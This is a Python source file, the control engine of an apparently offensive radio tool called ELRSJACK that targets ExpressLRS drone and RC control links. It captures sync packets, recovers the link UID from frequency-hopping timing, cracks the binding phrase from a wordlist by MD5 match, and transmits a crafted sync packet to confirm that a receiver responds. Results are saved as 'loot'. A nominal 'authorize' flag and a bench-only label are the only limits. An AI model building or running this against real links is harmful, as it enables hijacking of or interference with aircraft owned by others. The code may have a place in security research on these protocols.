"""ELRSJACK state machine.

The engine owns the radio.  The UI only reads state.json and appends commands
to cmd.jsonl, exactly like SHARD/NULLGATE, so a UI crash cannot touch the SX1262.

Honest status rules:
  - radio      = 'none' unless a real spidev node answered GetStatus.
  - sync_ok    = count of OTA-CRC-valid sync packets actually received.
  - uid        = set only when exactly one FHSS seed matches all observations.
  - phrase     = set only on an exact MD5 tail match from the wordlist.
  - probe      = 'CONFIRMED' only if a downlink response was heard after a
                 crafted sync packet.  No channel/control data is ever sent.
"""

from __future__ import annotations

import json
import os
import time
from typing import Callable

from . import capture as cap
from . import crack as crackmod
from . import crypto, fhss, ota, radio

STATE = os.environ.get("ELRSJACK_STATE", "/tmp/elrsjack_state.json")
CMD = os.environ.get("ELRSJACK_CMD", "/tmp/elrsjack_cmd.jsonl")
LOOT = os.environ.get("ELRSJACK_LOOT", "/root/loot/elrsjack")

PHASES = ["idle", "capture", "track", "recover", "crack", "probe", "done"]


def default_state() -> dict:
    return {
        "authorized": False,
        "phase": "idle",
        "radio": "none",
        "domain": "FCC915",
        "rate": "100Hz",
        "sync_word": "0x1212",
        "capture": {
            "raw_packets": 0, "valid_sync_packets": 0,
            "sync_observations": 0, "last_uid_tail": None,
            "sync_channel_hz": fhss.sync_frequency(fhss.DOMAINS["FCC915"]),
        },
        "recovery": {"uid": None, "candidates": 0, "observations": 0,
                     "confirmed": False, "method": "none"},
        "phrase": {"value": None, "tested": 0, "confirmed": False},
        "probe": {"sent": False, "confirmed": False, "detail": ""},
        "logs": ["ELRSJACK ready. Authorize to begin."],
        "error": "",
        "seq": 0,
    }


class Engine:
    def __init__(self, radio_obj=None, state_path=None, cmd_path=None, loot=None):
        self.state_path = state_path or STATE
        self.cmd_path = cmd_path or CMD
        self.loot = loot or LOOT
        self.radio_obj = radio_obj
        self.state = default_state()
        self.capture = cap.CaptureEngine(self.state["domain"])
        self.running = True
        self._offset_base: dict[tuple, int] = {}

    def log(self, message: str):
        self.state["logs"] = (self.state["logs"] + [message])[-40:]
        try:
            os.makedirs(self.loot, exist_ok=True)
            with open(os.path.join(self.loot, "elrsjack.log"), "a") as fh:
                fh.write(f"{time.strftime('%FT%TZ', time.gmtime())} {message}\n")
        except OSError:
            pass

    def save(self):
        self.state["seq"] += 1
        tmp = self.state_path + ".tmp"
        try:
            with open(tmp, "w") as fh:
                json.dump(self.state, fh, separators=(",", ":"))
            os.replace(tmp, self.state_path)
        except OSError:
            pass

    def _open_radio(self) -> bool:
        if self.radio_obj is not None:
            self.state["radio"] = getattr(self.radio_obj, "capability", "mock")
            return True
        try:
            dev = radio.SpiRadio()
            if not dev.probe():
                dev.close()
                self.state["radio"] = "none"
                self.log("NO RADIO: SX1262 did not answer on any spidev node.")
                return False
            self.radio_obj = dev
            self.state["radio"] = "spi"
            self.log(f"Radio ready on {dev.path}.")
            return True
        except radio.RadioError as exc:
            self.state["radio"] = "none"
            self.log(f"NO RADIO: {exc}")
            return False

    def _configure_radio(self):
        domain = fhss.DOMAINS[self.state["domain"]]
        rate = self.state["rate"]
        word = int(self.state["sync_word"], 16)
        self.radio_obj.configure(rate, fhss.sync_frequency(domain), word)
        self.radio_obj.start_rx()

    def handle(self, cmd: dict):
        action = cmd.get("cmd")
        if action == "stop":
            self.running = False
            return
        if action == "authorize":
            if not self.state["authorized"]:
                self.state["authorized"] = True
                self.log("Authorization accepted. Bench/lab use only.")
            return
        if not self.state["authorized"]:
            self.log("Command rejected: not authorized.")
            return

        if action == "domain":
            value = cmd.get("value")
            if value in fhss.DOMAINS:
                self.state["domain"] = value
                self.capture = cap.CaptureEngine(value)
                self.state["capture"]["sync_channel_hz"] = fhss.sync_frequency(fhss.DOMAINS[value])
                self.log(f"Domain set to {value}.")
            return
        if action == "rate":
            value = cmd.get("value")
            if value in radio.ELRS_RATES:
                self.state["rate"] = value
                self.log(f"Air rate set to {value}.")
            return
        if action == "syncword":
            value = cmd.get("value")
            try:
                self.state["sync_word"] = hex(int(value, 0) & 0xFFFF)
                self.log(f"Sync word candidate set to {self.state['sync_word']}.")
            except (TypeError, ValueError):
                self.log("Invalid sync word.")
            return
        if action == "capture":
            self._do_capture(float(cmd.get("seconds", 8)))
            return
        if action == "track":
            self._do_track(float(cmd.get("seconds", 12)), int(cmd.get("channel_hz", 0)))
            return
        if action == "recover":
            result = self.capture.recover_uid()
            self.state["recovery"] = {
                "uid": result.uid.hex() if result.uid else None,
                "candidates": result.candidates,
                "candidate_uids": [u.hex() for u in (result.candidate_uids or [])],
                "observations": result.observations_used,
                "confirmed": result.confirmed,
                "method": result.method,
            }
            self.log("UID: " + (result.uid.hex() if result.uid else
                               f"AMBIGUOUS ({result.candidates} candidates)"))
            return
        if action == "crack":
            self._do_crack(cmd.get("wordlist"))
            return
        if action == "probe":
            self._do_probe()
            return

    def _do_capture(self, seconds: float):
        self.state["phase"] = "capture"
        if not self._open_radio():
            self.state["phase"] = "idle"
            return
        try:
            self._configure_radio()
        except (radio.RadioError, OSError) as exc:
            self.state["error"] = str(exc)
            self.log(f"Radio configure failed: {exc}")
            self.state["phase"] = "idle"
            return

        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline and self.running:
            got = self.radio_obj.read_packet(timeout_s=0.3)
            if not got:
                continue
            payload, rssi = got
            sync = self.capture.feed_packet(payload, fhss.sync_frequency(
                fhss.DOMAINS[self.state["domain"]]), rssi, self.state["rate"])
            if sync:
                tail = f"{sync.uid4:02x}{sync.uid5:02x}"
                self.log(f"Sync packet OK: UID4/5={tail} idx={sync.fhss_index} RSSI={rssi}")
        self.state["capture"] = self.capture.snapshot()
        self.state["capture"]["sync_channel_hz"] = fhss.sync_frequency(
            fhss.DOMAINS[self.state["domain"]])
        self.state["phase"] = "idle"
        self._save_loot()

    def _do_track(self, seconds: float, channel_hz: int):
        """Listen on one fixed non-sync channel and record packet offsets."""
        self.state["phase"] = "track"
        if not self.radio_obj:
            if not self._open_radio():
                self.state["phase"] = "idle"
                return
        if not self.capture.sync_obs:
            self.log("TRACK needs a sync packet first (run SCAN).")
            self.state["phase"] = "idle"
            return
        latest = self.capture.sync_obs[-1]
        uid4, uid5, sync_index = latest.uid4, latest.uid5, latest.sync_index

        if not channel_hz:
            domain = fhss.DOMAINS[self.state["domain"]]
            # Pick a channel adjacent to sync; any non-sync channel works.
            idx = (domain.sync_channel + 1) % domain.freq_count
            channel_hz = domain.channel_hz(idx)
        try:
            self.radio_obj.configure(self.state["rate"], channel_hz,
                                     int(self.state["sync_word"], 16))
            self.radio_obj.start_rx()
        except (radio.RadioError, OSError) as exc:
            self.state["error"] = str(exc)
            self.log(f"TRACK configure failed: {exc}")
            self.state["phase"] = "idle"
            return

        # Fox-IT's timing method: the transmitter hops once per packet at a
        # known rate, so the hop offset is elapsed time / packet interval.
        # This works with ONE radio parked on a fixed channel.
        intervals = {"200Hz": 0.005, "100Hz": 0.010, "50Hz": 0.020, "25Hz": 0.040}
        interval = intervals.get(self.state["rate"], 0.010)
        sync_time = latest.seen_at
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline and self.running:
            got = self.radio_obj.read_packet(timeout_s=0.3)
            if not got:
                continue
            payload, _ = got
            if ota.parse_sync(payload) is not None:
                continue  # a new sync resets the reference; skip it
            offset = max(1, round((time.monotonic() - sync_time) / interval))
            self.capture.add_channel_sample(channel_hz, uid4, uid5, sync_index, offset)
        self.log(f"TRACK: {seconds:.0f}s on {channel_hz} Hz, offsets recorded.")
        self.state["capture"] = self.capture.snapshot()
        self.state["capture"]["sync_channel_hz"] = fhss.sync_frequency(
            fhss.DOMAINS[self.state["domain"]])
        self.state["phase"] = "idle"

    def _do_crack(self, wordlist=None):
        self.state["phase"] = "crack"
        candidates = self.state["recovery"].get("candidate_uids") or []
        uid_hex = self.state["recovery"].get("uid")
        if uid_hex and not candidates:
            candidates = [uid_hex]
        if not candidates:
            self.log("CRACK needs recovered UID candidates first.")
            self.state["phase"] = "idle"
            return
        path = wordlist or crackmod.load_default_wordlist()
        total_tested = 0
        found = None
        for candidate_hex in candidates:
            uid = bytes.fromhex(candidate_hex)
            result = crackmod.crack_uid_tail(uid[2:6], path)
            total_tested += result.tested
            if result.confirmed:
                found = (candidate_hex, result.phrase)
                break
        if found:
            self.state["recovery"]["uid"] = found[0]
            self.state["recovery"]["confirmed"] = True
        self.state["phrase"] = {
            "value": found[1] if found else None,
            "tested": total_tested,
            "confirmed": bool(found),
        }
        self.log("Phrase: " + (found[1] if found else
                               f"not found ({total_tested} candidates)"))
        self.state["phase"] = "idle"
        self._save_loot()

    def _do_probe(self):
        """Authorized bench only: send a sync packet, watch for a downlink."""
        self.state["phase"] = "probe"
        uid_hex = self.state["recovery"].get("uid")
        if not uid_hex:
            self.log("PROBE needs a recovered UID first.")
            self.state["phase"] = "idle"
            return
        uid = bytes.fromhex(uid_hex)
        domain = fhss.DOMAINS[self.state["domain"]]
        packet = ota.build_sync(uid, domain.sync_channel, packet_size=8)
        try:
            if not self.radio_obj:
                self._open_radio()
            self.radio_obj.configure(self.state["rate"], fhss.sync_frequency(domain),
                                     int(self.state["sync_word"], 16))
            self.radio_obj.command(radio.CMD_SET_STANDBY, b"\x00", rx_len=1)
            self.radio_obj.command(radio.CMD_SET_BUFFER_BASE_ADDRESS, b"\x00\x00", rx_len=1)
            self.radio_obj.command(radio.CMD_WRITE_BUFFER, b"\x00" + packet, rx_len=1)
            self.radio_obj.command(radio.CMD_SET_TX, b"\xFF\xFF\xFF", rx_len=1)
            time.sleep(0.2)
            self.radio_obj.start_rx()
            response = self.radio_obj.read_packet(timeout_s=2.0)
            confirmed = bool(response and ota.parse_sync(response[0]) is None)
            self.state["probe"] = {
                "sent": True, "confirmed": confirmed,
                "detail": "downlink heard after sync probe" if confirmed
                          else "no downlink observed",
            }
            self.log("PROBE: " + self.state["probe"]["detail"])
        except Exception as exc:  # noqa: BLE001 - log any radio failure honestly
            self.state["probe"] = {"sent": True, "confirmed": False,
                                   "detail": f"radio error: {exc}"}
            self.log(f"PROBE failed: {exc}")
        self.state["phase"] = "idle"
        self._save_loot()

    def _save_loot(self):
        try:
            os.makedirs(self.loot, exist_ok=True)
            with open(os.path.join(self.loot, "capture.json"), "w") as fh:
                json.dump(self.capture.snapshot(), fh, indent=2)
            with open(os.path.join(self.loot, "result.json"), "w") as fh:
                json.dump({k: self.state[k] for k in
                           ("recovery", "phrase", "probe")}, fh, indent=2)
        except OSError:
            pass

    def drain_commands(self):
        try:
            with open(self.cmd_path, "r") as fh:
                lines = fh.readlines()
        except OSError:
            return
        if not lines:
            return
        for line in lines:
            try:
                self.handle(json.loads(line))
            except (ValueError, TypeError):
                continue
        try:
            open(self.cmd_path, "w").close()
        except OSError:
            pass

    def run(self):
        open(self.cmd_path, "a").close()
        self.save()
        while self.running:
            self.drain_commands()
            self.save()
            time.sleep(0.1)
        if self.radio_obj and getattr(self.radio_obj, "close", None):
            self.radio_obj.close()
